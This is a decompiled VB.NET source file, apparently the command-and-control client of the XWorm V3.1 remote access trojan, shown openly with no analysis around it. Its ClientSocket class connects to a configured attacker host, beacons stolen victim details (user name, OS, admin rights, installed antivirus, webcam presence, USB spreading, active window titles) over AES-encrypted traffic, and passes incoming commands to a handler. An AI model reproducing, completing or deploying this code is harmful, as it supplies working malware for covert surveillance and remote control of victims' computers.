Imports System
Imports System.IO
Imports System.Management
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Text
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices

Namespace Stub
	' Token: 0x02000009 RID: 9
	Public Class ClientSocket
		' Token: 0x06000025 RID: 37 RVA: 0x00002DB4 File Offset: 0x00000FB4
		Public Shared Sub BeginConnect()
			Try
				ClientSocket.S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
				ClientSocket.BufferLength = -1L
				ClientSocket.Buffer = New Byte(0) {}
				ClientSocket.MS = New MemoryStream()
				ClientSocket.S.ReceiveBufferSize = 51200
				ClientSocket.S.SendBufferSize = 51200
				ClientSocket.S.Connect(Settings.Host, Conversions.ToInteger(Settings.Port))
				ClientSocket.isConnected = True
				ClientSocket.SendSync = RuntimeHelpers.GetObjectValue(New Object())
				ClientSocket.Send(Conversions.ToString(ClientSocket.Info()))
				ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, AddressOf ClientSocket.BeginReceive, Nothing)
				Dim callback As TimerCallback = Sub(a0 As Object)
					ClientSocket.Ping()
				End Sub
				ClientSocket.Tick = New Timer(callback, Nothing, New Random().[Next](10000, 15000), New Random().[Next](10000, 15000))
			Catch ex As Exception
				ClientSocket.isConnected = False
			Finally
				ClientSocket.allDone.[Set]()
			End Try
		End Sub

		' Token: 0x06000026 RID: 38 RVA: 0x00002F04 File Offset: 0x00001104
		Public Shared Function Info() As Object
			Dim computerInfo As ComputerInfo = New ComputerInfo()
			Return String.Concat(New Object() { "INFO", RuntimeHelpers.GetObjectValue(ClientSocket.SPL), Helper.ID(), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), Environment.UserName, RuntimeHelpers.GetObjectValue(ClientSocket.SPL), computerInfo.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString().Replace("False", "32bit").Replace("True", "64bit"), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), "XWorm V3.1", RuntimeHelpers.GetObjectValue(ClientSocket.SPL), ClientSocket.INDATE(), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), ClientSocket.Spread(), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), ClientSocket.UAC(), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), Messages.Cam(), RuntimeHelpers.GetObjectValue(ClientSocket.SPL), ClientSocket.Antivirus() })
		End Function

		' Token: 0x06000027 RID: 39 RVA: 0x00003060 File Offset: 0x00001260
		Public Shared Function INDATE() As String
			Dim result As String
			Try
				Dim fileInfo As FileInfo = New FileInfo(Helper.current)
				result = fileInfo.LastWriteTime.ToString("dd/MM/yyy")
			Catch ex As Exception
				result = "Error"
			End Try
			Return result
		End Function

		' Token: 0x06000028 RID: 40 RVA: 0x000030BC File Offset: 0x000012BC
		Public Shared Function Spread() As String
			Dim result As String
			Try
				If Operators.CompareString(Path.GetFileName(Helper.current), Settings.USBNM, False) = 0 Then
					result = "True"
				Else
					result = "False"
				End If
			Catch ex As Exception
				result = "Error"
			End Try
			Return result
		End Function

		' Token: 0x06000029 RID: 41 RVA: 0x00003124 File Offset: 0x00001324
		Public Shared Function UAC() As String
			Dim result As String
			Try
				result = New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString()
			Catch ex As Exception
				result = "Error"
			End Try
			Return result
		End Function

		' Token: 0x0600002A RID: 42 RVA: 0x00003180 File Offset: 0x00001380
		Public Shared Function Antivirus() As String
			Dim result As String
			Try
				Using managementObjectSearcher As ManagementObjectSearcher = New ManagementObjectSearcher("\\" + Environment.MachineName + "\root\SecurityCenter2", "Select * from AntivirusProduct")
					Dim stringBuilder As StringBuilder = New StringBuilder()
					Try
						For Each managementBaseObject As ManagementBaseObject In managementObjectSearcher.[Get]()
							stringBuilder.Append(managementBaseObject("displayName").ToString())
							stringBuilder.Append(",")
						Next
					Finally
						Dim enumerator As ManagementObjectCollection.ManagementObjectEnumerator
						If enumerator IsNot Nothing Then
							CType(enumerator, IDisposable).Dispose()
						End If
					End Try
					If stringBuilder.ToString().Length = 0 Then
						result = "None"
					Else
						' The following expression was wrapped in a checked-expression
						result = stringBuilder.ToString().Substring(0, stringBuilder.Length - 1)
					End If
				End Using
			Catch ex As Exception
				result = "None"
			End Try
			Return result
		End Function

		' Token: 0x0600002B RID: 43 RVA: 0x00003284 File Offset: 0x00001484
		Public Shared Sub BeginReceive(ar As IAsyncResult)
			' The following expression was wrapped in a checked-statement
			If ClientSocket.isConnected Then
				Try
					Dim num As Integer = ClientSocket.S.EndReceive(ar)
					If num > 0 Then
						If ClientSocket.BufferLength = -1L Then
							If ClientSocket.Buffer(0) = 0 Then
								ClientSocket.BufferLength = Conversions.ToLong(Helper.BS(ClientSocket.MS.ToArray()))
								ClientSocket.MS.Dispose()
								ClientSocket.MS = New MemoryStream()
								If ClientSocket.BufferLength = 0L Then
									ClientSocket.BufferLength = -1L
									ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, AddressOf ClientSocket.BeginReceive, ClientSocket.S)
									Return
								End If
								ClientSocket.Buffer = New Byte(CInt((ClientSocket.BufferLength - 1L)) + 1 - 1) {}
							Else
								ClientSocket.MS.WriteByte(ClientSocket.Buffer(0))
							End If
						Else
							ClientSocket.MS.Write(ClientSocket.Buffer, 0, num)
							If ClientSocket.MS.Length = ClientSocket.BufferLength Then
								ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
									ClientSocket.BeginRead(CType(a0, Byte()))
								End Sub, ClientSocket.MS.ToArray())
								ClientSocket.BufferLength = -1L
								ClientSocket.MS.Dispose()
								ClientSocket.MS = New MemoryStream()
								ClientSocket.Buffer = New Byte(0) {}
							Else
								ClientSocket.Buffer = New Byte(CInt((ClientSocket.BufferLength - ClientSocket.MS.Length - 1L)) + 1 - 1) {}
							End If
						End If
						ClientSocket.S.BeginReceive(ClientSocket.Buffer, 0, ClientSocket.Buffer.Length, SocketFlags.None, AddressOf ClientSocket.BeginReceive, ClientSocket.S)
					Else
						ClientSocket.isConnected = False
					End If
				Catch ex As Exception
					ClientSocket.isConnected = False
				End Try
			End If
		End Sub

		' Token: 0x0600002C RID: 44 RVA: 0x00003458 File Offset: 0x00001658
		Public Shared Sub BeginRead(b As Byte())
			Try
				Messages.Read(b)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600002D RID: 45 RVA: 0x0000348C File Offset: 0x0000168C
		Public Shared Sub Send(msg As String)
			Dim sendSync As Object = ClientSocket.SendSync
			ObjectFlowControl.CheckForSyncLockOnValueType(sendSync)
			SyncLock sendSync
				If ClientSocket.isConnected Then
					Try
						Using memoryStream As MemoryStream = New MemoryStream()
							Dim array As Byte() = Helper.AES_Encryptor(Helper.SB(msg))
							Dim array2 As Byte() = Helper.SB(Conversions.ToString(array.Length) + vbNullChar)
							memoryStream.Write(array2, 0, array2.Length)
							memoryStream.Write(array, 0, array.Length)
							ClientSocket.S.Poll(-1, SelectMode.SelectWrite)
							ClientSocket.S.BeginSend(memoryStream.ToArray(), 0, CInt(memoryStream.Length), SocketFlags.None, AddressOf ClientSocket.EndSend, Nothing)
						End Using
					Catch ex As Exception
						ClientSocket.isConnected = False
					End Try
				End If
			End SyncLock
		End Sub

		' Token: 0x0600002E RID: 46 RVA: 0x0000358C File Offset: 0x0000178C
		Public Shared Sub EndSend(ar As IAsyncResult)
			Try
				ClientSocket.S.EndSend(ar)
			Catch ex As Exception
				ClientSocket.isConnected = False
			End Try
		End Sub

		' Token: 0x0600002F RID: 47 RVA: 0x000035CC File Offset: 0x000017CC
		Public Shared Sub isDisconnected()
			If ClientSocket.Tick IsNot Nothing Then
				Try
					ClientSocket.Tick.Dispose()
					ClientSocket.Tick = Nothing
				Catch ex As Exception
				End Try
			End If
			If ClientSocket.MS IsNot Nothing Then
				Try
					ClientSocket.MS.Close()
					ClientSocket.MS.Dispose()
					ClientSocket.MS = Nothing
				Catch ex2 As Exception
				End Try
			End If
			If ClientSocket.S IsNot Nothing Then
				Try
					ClientSocket.S.Close()
					ClientSocket.S.Dispose()
					ClientSocket.S = Nothing
				Catch ex3 As Exception
				End Try
			End If
			GC.Collect()
		End Sub

		' Token: 0x06000030 RID: 48 RVA: 0x00003690 File Offset: 0x00001890
		Public Shared Sub Ping()
			Try
				If ClientSocket.isConnected Then
					ClientSocket.Send(String.Concat(New String() { "PING!", Settings.SPL, Helper.GetActiveWindowTitle(), Settings.SPL, Helper.Time }))
					GC.Collect()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000014 RID: 20
		Public Shared isConnected As Boolean = False

		' Token: 0x04000015 RID: 21
		Public Shared S As Socket = Nothing

		' Token: 0x04000016 RID: 22
		Private Shared BufferLength As Long = 0L

		' Token: 0x04000017 RID: 23
		Private Shared BufferLengthReceived As Boolean = False

		' Token: 0x04000018 RID: 24
		Private Shared Buffer As Byte()

		' Token: 0x04000019 RID: 25
		Private Shared MS As MemoryStream = Nothing

		' Token: 0x0400001A RID: 26
		Private Shared Tick As Timer = Nothing

		' Token: 0x0400001B RID: 27
		Public Shared allDone As ManualResetEvent = New ManualResetEvent(False)

		' Token: 0x0400001C RID: 28
		Private Shared SendSync As Object = Nothing

		' Token: 0x0400001D RID: 29
		Public Shared SPL As Object = Settings.SPL
	End Class
End Namespace
